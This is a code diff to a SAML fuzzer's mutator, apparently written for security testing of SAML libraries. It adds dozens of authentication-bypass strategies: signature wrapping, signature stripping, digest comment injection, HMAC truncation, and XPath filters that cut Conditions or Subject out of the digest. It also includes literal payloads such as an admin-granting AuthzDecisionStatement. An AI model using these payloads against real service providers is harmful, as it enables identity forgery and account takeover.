@@ -44,55 +44,105 @@ _FIXTURES_DIR = os.path.join(
     "targets", "saml_fixtures",
 )
 
-# Strategy indices that benefit from re-signing (modify signed content)
-_NEEDS_RESIGN: frozenset[int] = frozenset({
+# ── Re-signing action per strategy (name-based, index-independent) ──
+#
+# "needs": Strategy modifies signed content → re-sign to cross sig boundary
+# "blocks": Strategy modifies Signature internals → re-sign would undo it
+# Strategies not listed are neutral (neither need nor block re-signing).
+_RESIGN_ACTION: dict[str, str] = {
     # S2: parser differentials that modify Assertion tag/content
-    8,   # attr_pollution
-    10,  # namespace_redeclaration
-    13,  # namespace_undeclare
-    14,  # processing_instruction_inject
-    17,  # namespace_prefix_remap
-    # S6: protocol-level (modify Assertion internals)
-    36,  # nameid_spoof
-    37,  # audience_bypass
-    38,  # timestamp_manipulation
-    39,  # issuer_spoof
-    40,  # subject_confirmation_bypass
-    41,  # condition_manipulation
-    42,  # attribute_injection
-    # S8: Go quirk (adds attrs to Assertion)
-    49,  # go_encoding_xml_quirk
-    # H: newly discovered (modify NameID/Issuer text)
-    55,  # unicode_normalization
-    56,  # null_byte_inject
-    # I: extraction divergence (modify NameID structure)
-    58,  # nameid_mixed_content
-    59,  # multi_nameid
-})
-
-# Strategy indices that modify Signature internals — re-sign would undo them
-_BLOCKS_RESIGN: frozenset[int] = frozenset({
+    "attr_pollution": "needs",
+    "namespace_redeclaration": "needs",
+    "namespace_undeclare": "needs",
+    "processing_instruction_inject": "needs",
+    "namespace_prefix_remap": "needs",
     # S3: canonicalization/transform
-    19,  # comment_inject_digest
-    20,  # comment_inject_sigvalue
-    21,  # transform_chain_inject
-    22,  # transform_remove_enveloped
-    23,  # reference_uri_empty
-    24,  # reference_uri_xpointer
-    25,  # c14n_method_swap
+    "comment_inject_digest": "blocks",
+    "comment_inject_sigvalue": "blocks",
+    "transform_chain_inject": "blocks",
+    "transform_remove_enveloped": "blocks",
+    "reference_uri_empty": "blocks",
+    "reference_uri_xpointer": "blocks",
+    "c14n_method_swap": "blocks",
     # S4: signature validation bypass
-    26,  # sig_strip_all
-    27,  # sig_strip_assertion
-    28,  # algo_downgrade
-    29,  # hmac_confusion
-    30,  # duplicate_reference
-    31,  # keyinfo_confusion
-    32,  # signedinfo_manipulation
+    "sig_strip_all": "blocks",
+    "sig_strip_assertion": "blocks",
+    "algo_downgrade": "blocks",
+    "hmac_confusion": "blocks",
+    "duplicate_reference": "blocks",
+    "keyinfo_confusion": "blocks",
+    "signedinfo_manipulation": "blocks",
+    # S6: protocol-level (modify Assertion internals)
+    "nameid_spoof": "needs",
+    "audience_bypass": "needs",
+    "timestamp_manipulation": "needs",
+    "issuer_spoof": "needs",
+    "subject_confirmation_bypass": "needs",
+    "condition_manipulation": "needs",
+    "attribute_injection": "needs",
     # S7: crypto infrastructure
-    43,  # golden_saml_self_signed
-    # G4: void c14n with precomputed digest
-    53,  # void_c14n_precomputed_digest
-})
+    "golden_saml_self_signed": "blocks",
+    # S1: XSW4 modifies NameID inside signed assertion
+    "xsw4_assertion_swap": "needs",
+    # S8: Go quirk (adds attrs to Assertion)
+    "go_encoding_xml_quirk": "needs",
+    # S3: void c14n (modifies Assertion xmlns → needs re-sign to test exc-c14n)
+    "void_c14n_relative_ns": "needs",
+    # G: CVE gap strategies
+    "void_c14n_precomputed_digest": "blocks",
+    # H: newly discovered (modify NameID/Issuer text)
+    "unicode_normalization": "needs",
+    "null_byte_inject": "needs",
+    # I: extraction divergence (modify NameID structure)
+    "nameid_mixed_content": "needs",
+    "multi_nameid": "needs",
+    # J: breakthrough consensus
+    "saml11_namespace_downgrade": "needs",
+    "signature_relocation_to_response": "blocks",
+    # K: SAMLStorm variant strategies (modify Signature internals)
+    "digestvalue_leading_comment": "blocks",
+    "digestvalue_cdata_wrap": "blocks",
+    "digestvalue_split_comment": "blocks",
+    "sigvalue_multi_comment": "blocks",
+    "digestvalue_pi_inject": "blocks",
+    # L: C14N edge case strategies (modify assertion content)
+    "c14n_superfluous_ns": "needs",
+    "c14n_inherited_ns": "needs",
+    "c14n_attr_value_normalization": "needs",
+    "c14n_default_vs_prefixed_ns": "needs",
+    "c14n_xml_inherited_attrs": "needs",
+    # M: Novel attack vector (modifies transform chain)
+    "xpath_transform_exclude_subject": "blocks",
+    # N: Gap-derived
+    "digestmethod_only_downgrade": "blocks",
+    "unicode_identity_confusion": "needs",
+    "xslt_pre_verification_transform": "blocks",
+    "void_c14n_enhanced": "needs",
+    # O: XML-DSig spec-derived (§4.3, §4.4, §5.1)
+    "signedinfo_c14n_swap": "blocks",
+    "transform_remove_c14n": "blocks",
+    "xpointer_comment_preservation": "blocks",
+    "hmac_truncation_attack": "blocks",
+    "manifest_reference_inject": "blocks",
+    "reference_dual_target": "blocks",
+    "keyinfo_keyname": "blocks",
+    "keyinfo_retrieval_method": "blocks",
+    "reference_type_manifest": "blocks",
+    # P: C14N / XPath Filter spec-derived
+    "c14n_prefixlist_inject": "blocks",
+    "c14n_qname_in_attrvalue": "needs",
+    "c14n_xml_attr_ancestor": "needs",
+    "c14n_default_ns_switch": "needs",
+    "c14n_2_0_algorithm_swap": "blocks",
+    # Q: SAML Core/Profiles spec-derived
+    "subject_confirmation_sender_vouches": "needs",
+    "authz_decision_inject": "needs",
+    "sso_expired_signed": "needs",
+    # R: XPath Filter 2.0 spec-derived
+    "xpath_filter2_subtract_conditions": "blocks",
+    "xpath_filter2_union_evil": "blocks",
+    "xpath_filter2_multi_step": "blocks",
+}
 
 # ── Evil NameID values for injection ─────────────────────────────
 
@@ -252,6 +302,7 @@ C14N_ALGORITHMS = [
     b"http://www.w3.org/2001/10/xml-exc-c14n#WithComments",
     b"http://www.w3.org/2006/12/xml-c14n11",
     b"http://www.w3.org/2006/12/xml-c14n11#WithComments",
+    b"http://www.w3.org/2010/xml-c14n2",              # C14N 2.0 (Note, not Rec)
     b"",
 ]
 
@@ -270,6 +321,98 @@ SUBJECT_CONFIRMATION_METHODS = [
     b"urn:oasis:names:tc:SAML:2.0:cm:sender-vouches",
     b"",
     b"urn:evil",
+]
+
+# ── XPath Filter 2.0 payloads (spec-derived) ──────────────────
+XPATH_FILTER2_SUBTRACT_PAYLOADS = [
+    # Exclude Conditions from digest (allow expired assertions)
+    (
+        b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
+        b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="subtract"'
+        b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
+        b'//saml:Conditions'
+        b'</XPath></ds:Transform>'
+    ),
+    # Exclude Subject (allow NameID modification)
+    (
+        b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
+        b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="subtract"'
+        b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
+        b'//saml:Subject'
+        b'</XPath></ds:Transform>'
+    ),
+    # Exclude AttributeStatement
+    (
+        b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
+        b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="subtract"'
+        b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
+        b'//saml:AttributeStatement'
+        b'</XPath></ds:Transform>'
+    ),
+]
+
+XPATH_FILTER2_UNION_PAYLOADS = [
+    # Union: include additional evil content in digest scope
+    (
+        b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
+        b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="union">'
+        b'//*'
+        b'</XPath></ds:Transform>'
+    ),
+]
+
+# ── Manifest template (xmldsig-core §5.1) ─────────────────────
+MANIFEST_TEMPLATE = (
+    b'<ds:Object xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
+    b'<ds:Manifest Id="_manifest_001">'
+    b'<ds:Reference URI="#{REF_URI}">'
+    b'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
+    b'<ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>'
+    b'</ds:Reference>'
+    b'</ds:Manifest>'
+    b'</ds:Object>'
+)
+
+# ── KeyInfo alternative payloads (xmldsig-core §4.4) ──────────
+KEYINFO_KEYNAME_PAYLOADS = [
+    b"<ds:KeyInfo><ds:KeyName>idp-signing-key</ds:KeyName></ds:KeyInfo>",
+    b"<ds:KeyInfo><ds:KeyName>default</ds:KeyName></ds:KeyInfo>",
+    b"<ds:KeyInfo><ds:KeyName>*</ds:KeyName></ds:KeyInfo>",
+    b"<ds:KeyInfo><ds:KeyName></ds:KeyName></ds:KeyInfo>",
+]
+
+KEYINFO_RETRIEVAL_PAYLOADS = [
+    b'<ds:KeyInfo><ds:RetrievalMethod URI="#_cert_object"'
+    b' Type="http://www.w3.org/2000/09/xmldsig#X509Data"/></ds:KeyInfo>',
+    b'<ds:KeyInfo><ds:RetrievalMethod URI=""'
+    b' Type="http://www.w3.org/2000/09/xmldsig#rawX509Certificate"/></ds:KeyInfo>',
+]
+
+# ── HMAC truncation payloads (xmldsig-core §4.3.2) ────────────
+HMAC_TRUNCATION_LENGTHS = [
+    b"<ds:HMACOutputLength>1</ds:HMACOutputLength>",
+    b"<ds:HMACOutputLength>8</ds:HMACOutputLength>",
+    b"<ds:HMACOutputLength>32</ds:HMACOutputLength>",
+    b"<ds:HMACOutputLength>80</ds:HMACOutputLength>",
+]
+
+# ── AuthzDecisionStatement payload (saml-core §2.7.2.2) ───────
+AUTHZ_DECISION_STATEMENT = (
+    b'<saml:AuthzDecisionStatement Resource="https://sp.example.com/admin"'
+    b' Decision="Permit">'
+    b'<saml:Action Namespace="urn:oasis:names:tc:SAML:1.0:action:rwedc">'
+    b'Read</saml:Action>'
+    b'</saml:AuthzDecisionStatement>'
+)
+
+# ── C14N 2.0 parameter payloads ───────────────────────────────
+C14N2_PARAMS = [
+    b'<c14n2:InclusiveNamespaces xmlns:c14n2="http://www.w3.org/2010/xml-c14n2"'
+    b' PrefixList="saml ds"/>',
+    b'<c14n2:PrefixRewrite xmlns:c14n2="http://www.w3.org/2010/xml-c14n2">'
+    b'sequential</c14n2:PrefixRewrite>',
+    b'<c14n2:TrimTextNodes xmlns:c14n2="http://www.w3.org/2010/xml-c14n2">'
+    b'true</c14n2:TrimTextNodes>',
 ]
 
 EVIL_ATTRIBUTES = [
@@ -536,16 +679,34 @@ _RE_SIGNED_INFO = re.compile(
     re.IGNORECASE | re.DOTALL,
 )
 
+_RE_CONDITIONS = re.compile(
+    rb"(<saml:Conditions\b[^>]*>)(.*?)(</saml:Conditions>)",
+    re.IGNORECASE | re.DOTALL,
+)
+_RE_AUTHN_STATEMENT = re.compile(
+    rb"(<saml:AuthnStatement\b[^>]*>)(.*?)(</saml:AuthnStatement>)",
+    re.IGNORECASE | re.DOTALL,
+)
+_RE_C14N_TRANSFORM = re.compile(
+    rb'<ds:Transform\s+Algorithm="(http://www\.w3\.org/2001/10/xml-exc-c14n#)"',
+    re.IGNORECASE | re.DOTALL,
+)
+
 # Precomputed empty-string SHA-256 digest (base64)
 EMPTY_SHA256_B64 = b"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="
 
 MAX_OUTPUT_SIZE = 100_000
 
 
-def _make_evil_assertion(rng: random.Random) -> bytes:
-    """Build an unsigned evil assertion with a random admin NameID."""
+def _make_evil_assertion(rng: random.Random, sentinel: bytes | None = None) -> bytes:
+    """Build an unsigned evil assertion with a sentinel or random NameID.
+
+    When *sentinel* is provided it is used as the NameID so the oracle can
+    later verify that the accepting library extracted the attacker-controlled
+    identity (HIGH exploit_confidence).
+    """
     evil_id = rng.randbytes(8).hex().encode()
-    nameid = rng.choice(EVIL_NAMEIDS)
+    nameid = sentinel if sentinel is not None else rng.choice(EVIL_NAMEIDS)
     return (
         XSW_ASSERTION_TEMPLATE
         .replace(b"{EVIL_ID}", evil_id)
@@ -571,8 +732,10 @@ def _find_element_span(
 # ── Lazy-loaded re-signing state (module-level singleton) ────────
 # Avoids repeated key reads and signer construction per mutation.
 
-_resign_key: bytes | None = None
-_resign_cert: bytes | None = None
+_resign_key: object | None = None      # Pre-loaded RSAPrivateKey object
+_resign_cert: list | None = None       # Pre-loaded x509 cert list
+_resign_key_pem: bytes | None = None   # Raw PEM for fallback
+_resign_cert_pem: bytes | None = None  # Raw PEM for fallback
 _resign_signer: object | None = None
 _resign_init_failed: bool = False
 
@@ -581,8 +744,14 @@ _DS_NS = "http://www.w3.org/2000/09/xmldsig#"
 
 
 def _get_signer():
-    """Return a cached (key_pem, cert_pem, XMLSigner) tuple, or None."""
+    """Return a cached (key_obj, cert_list, XMLSigner) tuple, or None.
+
+    Pre-loads the PEM key into an RSAPrivateKey object so that
+    signxml.sign() does not call load_pem_private_key on every
+    invocation (~100ms per call on Windows).
+    """
     global _resign_key, _resign_cert, _resign_signer, _resign_init_failed
+    global _resign_key_pem, _resign_cert_pem
     if _resign_init_failed:
         return None
     if _resign_signer is not None:
@@ -592,9 +761,17 @@ def _get_signer():
         key_path = os.path.join(_FIXTURES_DIR, "idp_key.pem")
         cert_path = os.path.join(_FIXTURES_DIR, "idp_cert.pem")
         with open(key_path, "rb") as f:
-            _resign_key = f.read()
+            _resign_key_pem = f.read()
         with open(cert_path, "rb") as f:
-            _resign_cert = f.read()
+            _resign_cert_pem = f.read()
+
+        # Pre-load key as RSAPrivateKey to avoid per-sign PEM parsing
+        from cryptography.hazmat.primitives.serialization import load_pem_private_key
+        _resign_key = load_pem_private_key(_resign_key_pem, password=None)
+
+        # Pre-load cert as x509 objects
+        from cryptography import x509 as _x509
+        _resign_cert = [_x509.load_pem_x509_certificate(_resign_cert_pem)]
 
         from signxml import XMLSigner
         from signxml.algorithms import (
@@ -619,17 +796,22 @@ def _get_signer():
 
 
 def _resign_assertion_bytes(data: bytes) -> bytes | None:
-    """Re-sign the first Assertion in *data* with the test IdP key.
+    """Re-sign the *original* Assertion in *data* with the test IdP key.
 
-    Returns re-signed XML bytes, or None if re-signing fails (malformed
-    XML, missing Assertion, signxml error, etc.).  Callers should fall
-    back to the unsigned mutant on None.
+    Uses a 3-tier strategy to find the original (not evil) assertion:
+      1. Reference URI in existing Signature → follow to target element
+      2. Assertion that contains an enveloped Signature child
+      3. Last Assertion in document order (XSW inserts evil *before*)
+
+    Returns re-signed XML bytes, or None on failure.
     """
     ctx = _get_signer()
     if ctx is None:
         return None
 
-    key_pem, cert_pem, signer = ctx
+    key_obj, cert_list, signer = ctx
+
+    _DS = "http://www.w3.org/2000/09/xmldsig#"
 
     try:
         from lxml import etree
@@ -640,15 +822,44 @@ def _resign_assertion_bytes(data: bytes) -> bytes | None:
         if root is None:
             return None
 
-        # Find assertion (namespaced or fallback to local name)
-        assertion = root.find(f"{{{_SAML_NS}}}Assertion")
-        if assertion is None:
-            # Try without namespace (namespace_prefix_remap may change prefix)
+        def _is_assertion(elem):
+            if not isinstance(elem.tag, str):
+                return False
+            return etree.QName(elem.tag).localname == "Assertion"
+
+        # Strategy 1: Follow Reference URI to the signed assertion
+        assertion = None
+        for ref in root.iter(f"{{{_DS}}}Reference"):
+            uri = ref.get("URI", "")
+            if not uri.startswith("#"):
+                continue
+            target_id = uri[1:]
             for elem in root.iter():
-                local = etree.QName(elem.tag).localname if isinstance(elem.tag, str) else ""
-                if local == "Assertion":
+                if not isinstance(elem.tag, str):
+                    continue
+                if elem.get("ID") == target_id and _is_assertion(elem):
                     assertion = elem
                     break
+            if assertion is not None:
+                break
+
+        # Strategy 2: Assertion with enveloped Signature child
+        if assertion is None:
+            for elem in root.iter():
+                if not _is_assertion(elem):
+                    continue
+                for child in elem:
+                    if isinstance(child.tag, str) and etree.QName(child.tag).localname == "Signature":
+                        assertion = elem
+                        break
+                if assertion is not None:
+                    break
+
+        # Strategy 3: Last assertion (XSW typically inserts evil before original)
+        if assertion is None:
+            all_a = [e for e in root.iter() if _is_assertion(e)]
+            assertion = all_a[-1] if all_a else None
+
         if assertion is None:
             return None
 
@@ -659,8 +870,9 @@ def _resign_assertion_bytes(data: bytes) -> bytes | None:
                 if local == "Signature":
                     assertion.remove(sig)
 
-        # Sign
-        signed_assertion = signer.sign(assertion, key=key_pem, cert=cert_pem)
+        # Sign — key_obj is pre-loaded RSAPrivateKey, cert_list is [x509.Certificate]
+        # This avoids load_pem_private_key on every call (~100ms each).
+        signed_assertion = signer.sign(assertion, key=key_obj, cert=cert_list)
 
         # Replace original assertion with signed version
         parent = assertion.getparent()
@@ -686,8 +898,9 @@ class SamlMutator:
 
     name = "saml"
 
-    def __init__(self, seed: int | None = None) -> None:
+    def __init__(self, seed: int | None = None, max_assertions: int = 0) -> None:
         self.rng = random.Random(seed)
+        self._max_assertions = max_assertions  # 0 = no limit
         self._strategies: list = [
             # ── S1: XSW Signature Wrapping ──
             self._xsw1_pre_assertion_clone,       # 0
@@ -762,6 +975,54 @@ class SamlMutator:
             self._multi_nameid,                   # 59  NEW
             self._inclusive_ns_manipulate,         # 60  NEW
             self._assertion_id_collision,          # 61  NEW
+            # ── J: Breakthrough consensus strategies ──
+            self._sibling_attribute_inject,        # 62  NEW
+            self._saml11_namespace_downgrade,      # 63  NEW
+            self._signature_relocation_to_response,  # 64  NEW
+            # ── K: SAMLStorm variant strategies ──
+            self._digestvalue_leading_comment,         # 65  SAMLStorm firstChild
+            self._digestvalue_cdata_wrap,               # 66  CDATA variant
+            self._digestvalue_split_comment,            # 67  Split text node
+            self._sigvalue_multi_comment,               # 68  SignatureValue variants
+            self._digestvalue_pi_inject,                # 69  PI variant
+            # ── L: C14N edge case strategies ──
+            self._c14n_superfluous_ns,                  # 70  Unused NS decls
+            self._c14n_inherited_ns,                    # 71  NS on ancestor
+            self._c14n_attr_value_normalization,        # 72  CR/LF/TAB in attrs
+            self._c14n_default_vs_prefixed_ns,          # 73  Default NS swap
+            self._c14n_xml_inherited_attrs,             # 74  xml:lang/xml:space
+            # ── M: Novel attack vector ──
+            self._xpath_transform_exclude_subject,      # 75  XPath exclusion
+            # ── N: Gap-derived strategies ──
+            self._encrypted_assertion_wrapping,          # 76  CVE-2024-4985 class
+            self._digestmethod_only_downgrade,           # 77  MD5 digest downgrade
+            self._unicode_identity_confusion,            # 78  Invisible Unicode in NameID
+            self._xslt_pre_verification_transform,       # 79  XSLT before sig verify
+            self._void_c14n_enhanced,                    # 80  Enhanced void c14n
+            # ── O: XML-DSig spec-derived (§4.3, §4.4, §5.1) ──
+            self._signedinfo_c14n_swap,                  # 81  SignedInfo c14n divergence
+            self._transform_remove_c14n,                 # 82  Implicit c14n default
+            self._xpointer_comment_preservation,         # 83  Scheme-based XPointer
+            self._hmac_truncation_attack,                # 84  HMACOutputLength bypass
+            self._manifest_reference_inject,             # 85  Manifest in Object
+            self._reference_dual_target,                 # 86  Two References, diff targets
+            self._keyinfo_keyname,                       # 87  KeyName instead of X509
+            self._keyinfo_retrieval_method,              # 88  RetrievalMethod URI
+            self._reference_type_manifest,               # 89  Reference Type=Manifest
+            # ── P: C14N / XPath Filter spec-derived ──
+            self._c14n_prefixlist_inject,                # 90  PrefixList manipulation
+            self._c14n_qname_in_attrvalue,               # 91  QName in attr value
+            self._c14n_xml_attr_ancestor,                # 92  xml:lang/xml:space
+            self._c14n_default_ns_switch,                # 93  Default NS swap
+            self._c14n_2_0_algorithm_swap,               # 94  C14N 2.0 URI
+            # ── Q: SAML Core/Profiles spec-derived ──
+            self._subject_confirmation_sender_vouches,   # 95  sender-vouches method
+            self._authz_decision_inject,                 # 96  AuthzDecisionStatement
+            self._sso_expired_signed,                    # 97  Expired + valid sig
+            # ── R: XPath Filter 2.0 spec-derived ──
+            self._xpath_filter2_subtract_conditions,     # 98  Subtract Conditions
+            self._xpath_filter2_union_evil,              # 99  Union evil content
+            self._xpath_filter2_multi_step,              # 100 Multi-step filter
         ]
         self._strategy_names: list[str] = [fn.__name__.lstrip("_") for fn in self._strategies]
         self._weights: list[int] = [
@@ -787,8 +1048,92 @@ class SamlMutator:
             7, 6, 7,
             # I: Extraction divergence strategies
             8, 7, 6, 7,
+            # J: Breakthrough consensus strategies
+            7, 6, 7,
+            # K: SAMLStorm variant strategies
+            9, 9, 9, 9, 9,
+            # L: C14N edge case strategies
+            8, 8, 8, 8, 8,
+            # M: Novel attack vector
+            10,
+            # N: Gap-derived strategies
+            8, 9, 8, 9, 7,
+            # O: XML-DSig spec-derived (signedinfo_c14n through reference_type)
+            10, 10, 10, 8, 8, 8, 7, 6, 6,
+            # P: C14N / XPath Filter spec-derived
+            10, 9, 8, 8, 7,
+            # Q: SAML Core/Profiles spec-derived
+            9, 8, 7,
+            # R: XPath Filter 2.0 spec-derived
+            10, 8, 8,
         ]
+        self._base_weights: list[int] = list(self._weights)
+        self._strategy_finds: list[int] = [0] * len(self._strategies)
+        self._strategy_cov: list[int] = [0] * len(self._strategies)
+        self._total_feedback_calls: int = 0
         assert len(self._strategies) == len(self._weights)
+
+        # Build resign sets from name-based mapping (index-independent)
+        self._needs_resign: frozenset[int] = frozenset(
+            i for i, name in enumerate(self._strategy_names)
+            if _RESIGN_ACTION.get(name) == "needs"
+        )
+        self._blocks_resign: frozenset[int] = frozenset(
+            i for i, name in enumerate(self._strategy_names)
+            if _RESIGN_ACTION.get(name) == "blocks"
+        )
+        # XSW strategies for sentinel attachment (S1 group)
+        self._xsw_indices: frozenset[int] = frozenset(
+            i for i, name in enumerate(self._strategy_names)
+            if name.startswith("xsw") or name == "xsw_envelope_inversion"
+        )
+
+    # ── Concolic constraint hint ────────────────────────────────
+
+    _active_constraints: list | None = None
+
+    def set_constraint_hint(self, constraints: list | None) -> None:
+        """Set active constraints to bias strategy selection."""
+        self._active_constraints = constraints
+
+    def _constraint_biased_weights(self) -> list[int]:
+        """Temporarily boost weights for strategies relevant to active constraints."""
+        if not self._active_constraints:
+            return self._weights
+        boosted = list(self._weights)
+        relevant: set[str] = set()
+        for c in self._active_constraints:
+            cats = c.relevant_categories if hasattr(c, 'relevant_categories') else set()
+            relevant.update(cats)
+        if not relevant:
+            return self._weights
+        for i, name in enumerate(self._strategy_names):
+            if name in relevant:
+                boosted[i] = min(boosted[i] * 3, self._base_weights[i] * 5)
+        return boosted
+
+    # ── Learned weight feedback (v2 property-learning) ─────────
+
+    _learned_weights: dict[str, float] | None = None
+
+    def apply_learned_weights(self, strategy_effectiveness: dict[str, float]) -> None:
+        """Apply learned strategy weight adjustments from PropertyGuidedCoordinator.
+
+        strategy_effectiveness: {strategy_name: divergence_rate}
+        Higher divergence_rate → higher weight.
+        """
+        if not strategy_effectiveness:
+            return
+        self._learned_weights = strategy_effectiveness
+        max_rate = max(strategy_effectiveness.values()) or 1.0
+        for i, name in enumerate(self._strategy_names):
+            rate = strategy_effectiveness.get(name, 0.0)
+            if rate > 0:
+                boost = 1.0 + 2.0 * (rate / max_rate)  # 1x-3x
+                self._weights[i] = min(
+                    int(self._base_weights[i] * boost),
+                    self._base_weights[i] * 5,
+                )
 
     # ── Public API ───────────────────────────────────────────────
 
@@ -802,12 +1147,18 @@ class SamlMutator:
                 b"<saml:Assertion/></samlp:Response>"
             )
 
+        # Generate sentinel for XSW strategies so the oracle can verify
+        # whether the accepting library extracted the attacker identity.
+        sentinel_tag = b"FUZZ_EVIL_" + self.rng.randbytes(4).hex().encode()
+        self._current_sentinel = sentinel_tag
+
         num_ops = self.rng.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]
         applied: list[str] = []
         applied_indices: list[int] = []
+        _effective_weights = self._constraint_biased_weights()
         for _ in range(num_ops):
             idx = self.rng.choices(
-                range(len(self._strategies)), weights=self._weights, k=1
+                range(len(self._strategies)), weights=_effective_weights, k=1
             )[0]
             strategy = self._strategies[idx]
             result = strategy(data)
@@ -819,23 +1170,26 @@ class SamlMutator:
         if len(data) > MAX_OUTPUT_SIZE:
             data = data[:MAX_OUTPUT_SIZE]
 
-        # ── Post-mutation re-signing ─────────────────────────────
-        # If any applied strategy modifies signed content (Group B)
-        # and no strategy modifies Signature internals (would be
-        # undone by re-signing), re-sign the Assertion to produce
-        # a valid signature over the mutated content.  This lets the
-        # fuzzer explore post-validation parser behaviour (NameID
-        # extraction, attribute handling, etc.) instead of getting
-        # stuck at the signature-check boundary.
+        # ── Assertion count limit enforcement ────────────────────
+        if self._max_assertions > 0:
+            data = self._enforce_assertion_limit(data)
+
+        # ── Post-mutation re-signing (opt-out model) ──────────────
+        # Re-sign the Assertion unless a "blocks" strategy was applied
+        # (those intentionally modify Signature internals).  This
+        # maximises sig_valid=True throughput so the fuzzer can explore
+        # post-validation parser behaviour and reach danger levels 5-6.
         resigned = False
         idx_set = frozenset(applied_indices)
-        needs = idx_set & _NEEDS_RESIGN
-        blocks = idx_set & _BLOCKS_RESIGN
-        if needs and not blocks:
+        blocks = idx_set & self._blocks_resign
+        if not blocks:
             resigned_data = _resign_assertion_bytes(bytes(data))
             if resigned_data is not None:
                 data = bytearray(resigned_data)
                 resigned = True
+
+        # XSW strategies inject evil assertions — attach sentinel
+        evil_sentinel = sentinel_tag.decode() if (idx_set & self._xsw_indices) else None
 
         return Input(
             data=bytes(data),
@@ -844,8 +1198,45 @@ class SamlMutator:
                 "mutator": self.name,
                 "strategies": applied,
                 "resigned": resigned,
+                **({"evil_sentinel": evil_sentinel} if evil_sentinel else {}),
             },
         )
+
+    def _enforce_assertion_limit(self, data: bytearray) -> bytearray:
+        """Remove excess Assertion elements if max_assertions is set."""
+        import re
+        tag = b"<saml:Assertion"
+        count = data.count(tag)
+        if count <= self._max_assertions:
+            return data
+        # Keep first N assertions, remove the rest by stripping extra
+        # opening+closing tags. Simple approach: find Nth+1 assertion start
+        # and truncate before it (keeping the rest of the Response).
+        pos = 0
+        for _ in range(self._max_assertions):
+            idx = data.find(tag, pos)
+            if idx < 0:
+                return data
+            pos = idx + len(tag)
+        # Find the Nth+1 assertion and remove everything from there
+        # to the corresponding closing tag
+        while True:
+            start = data.find(tag, pos)
+            if start < 0:
+                break
+            # Find matching </saml:Assertion>
+            end_tag = b"</saml:Assertion>"
+            end = data.find(end_tag, start)
+            if end < 0:
+                # Self-closing or malformed — just remove opening
+                end_sc = data.find(b"/>", start)
+                if end_sc >= 0 and end_sc < start + 500:
+                    data = data[:start] + data[end_sc + 2:]
+                else:
+                    break
+            else:
+                data = data[:start] + data[end + len(end_tag):]
+        return data
 
     # ══════════════════════════════════════════════════════════════
     # S1: XML Signature Wrapping (XSW)
@@ -856,30 +1247,33 @@ class SamlMutator:
 
         SP using //Assertion or first-child semantics picks the evil copy.
         """
+        sentinel = getattr(self, "_current_sentinel", None)
         span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
         if not span:
             return None
-        evil = _make_evil_assertion(self.rng)
+        evil = _make_evil_assertion(self.rng, sentinel)
         return bytearray(
             bytes(data[: span[0]]) + evil + b"\n" + bytes(data[span[0] :])
         )
 
     def _xsw2_post_assertion_clone(self, data: bytearray) -> bytearray | None:
         """XSW2: Inject evil assertion AFTER the legitimate one."""
+        sentinel = getattr(self, "_current_sentinel", None)
         span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
         if not span:
             return None
-        evil = _make_evil_assertion(self.rng)
+        evil = _make_evil_assertion(self.rng, sentinel)
         return bytearray(
             bytes(data[: span[1]]) + b"\n" + evil + bytes(data[span[1] :])
         )
 
     def _xsw3_assertion_in_assertion(self, data: bytearray) -> bytearray | None:
         """XSW4: Nest evil assertion INSIDE the legitimate assertion."""
+        sentinel = getattr(self, "_current_sentinel", None)
         m = _RE_ASSERTION_CLOSE.search(data)
         if not m:
             return None
-        evil = _make_evil_assertion(self.rng)
+        evil = _make_evil_assertion(self.rng, sentinel)
         pos = m.start()
         return bytearray(
             bytes(data[:pos]) + evil + b"\n" + bytes(data[pos:])
@@ -887,10 +1281,11 @@ class SamlMutator:
 
     def _xsw4_assertion_swap(self, data: bytearray) -> bytearray | None:
         """XSW5: Modify NameID in signed assertion, keep original as decoy."""
+        sentinel = getattr(self, "_current_sentinel", None)
         m = _RE_NAMEID.search(data)
         if not m:
             return None
-        evil_nameid = self.rng.choice(EVIL_NAMEIDS)
+        evil_nameid = sentinel if sentinel is not None else self.rng.choice(EVIL_NAMEIDS)
         return bytearray(
             bytes(data[: m.start(2)])
             + evil_nameid
@@ -899,21 +1294,23 @@ class SamlMutator:
 
     def _xsw5_post_signature_assertion(self, data: bytearray) -> bytearray | None:
         """XSW6: Insert evil assertion right after the Signature element."""
+        sentinel = getattr(self, "_current_sentinel", None)
         span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
         if not span:
             return None
-        evil = _make_evil_assertion(self.rng)
+        evil = _make_evil_assertion(self.rng, sentinel)
         return bytearray(
             bytes(data[: span[1]]) + b"\n" + evil + bytes(data[span[1] :])
         )
 
     def _xsw7_extensions_embed(self, data: bytearray) -> bytearray | None:
         """XSW7: Move legit assertion into Extensions, replace with evil."""
+        sentinel = getattr(self, "_current_sentinel", None)
         span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
         if not span:
             return None
         original = bytes(data[span[0] : span[1]])
-        evil = _make_evil_assertion(self.rng)
+        evil = _make_evil_assertion(self.rng, sentinel)
         wrapped = (
             XSW_EXTENSIONS_PREFIX + original + XSW_EXTENSIONS_SUFFIX
         )
@@ -927,6 +1324,7 @@ class SamlMutator:
 
     def _xsw8_object_embed(self, data: bytearray) -> bytearray | None:
         """XSW8: Move legit assertion into ds:Object, replace with evil."""
